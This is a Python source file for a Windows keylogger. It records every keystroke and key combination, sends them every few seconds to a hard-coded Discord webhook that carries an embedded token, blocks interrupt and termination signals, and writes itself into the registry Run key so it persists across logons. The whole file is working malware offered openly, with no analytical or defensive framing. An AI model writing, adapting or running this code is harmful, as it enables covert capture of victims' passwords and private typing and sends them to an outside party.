import keyboard
import threading
import time
import signal
import requests
import ctypes
import sys
import os
import winreg

WEBHOOK_URL = "https://discord.com/api/webhooks/1418238709647544433/_Gqh1R9ufYiDLIjO4Bty5TDHIbA4LEcHG9C_Qrl4WHs17ZgUaAElNa-uz-XVJSk0GTNJ"

normal_keys = []
combo_keys = []
pressed_keys = set()
lock = threading.Lock()

def block_exit_signals():
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    try:
        ctypes.windll.kernel32.SetConsoleCtrlHandler(None, True)
    except Exception:
        pass

def send_to_discord(message):
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except:
        pass

def log_key(event):
    key = event.name.lower()
    if event.event_type == "down":
        if key not in pressed_keys:
            pressed_keys.add(key)
            if any(mod in pressed_keys for mod in ['ctrl', 'shift', 'alt']) and len(pressed_keys) > 1:
                combo = '+'.join(f"[{k}]" for k in sorted(pressed_keys))
                with lock:
                    combo_keys.append(f"Combo: {combo}")
            elif key not in ['ctrl', 'shift', 'alt']:
                with lock:
                    normal_keys.append(f"[{key}]")
    elif event.event_type == "up":
        pressed_keys.discard(key)

def sender():
    while True:
        time.sleep(7)
        with lock:
            if normal_keys:
                send_to_discord("Key: " + ' '.join(normal_keys))
                normal_keys.clear()
            for combo in combo_keys:
                send_to_discord(combo)
            combo_keys.clear()

def add_to_startup(app_name="MyKeyLogger", exe_path=None):
    if exe_path is None:
        exe_path = os.path.abspath(sys.argv[0])
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

block_exit_signals()
add_to_startup()

threading.Thread(target=sender, daemon=True).start()
keyboard.hook(log_key)
keyboard.wait()
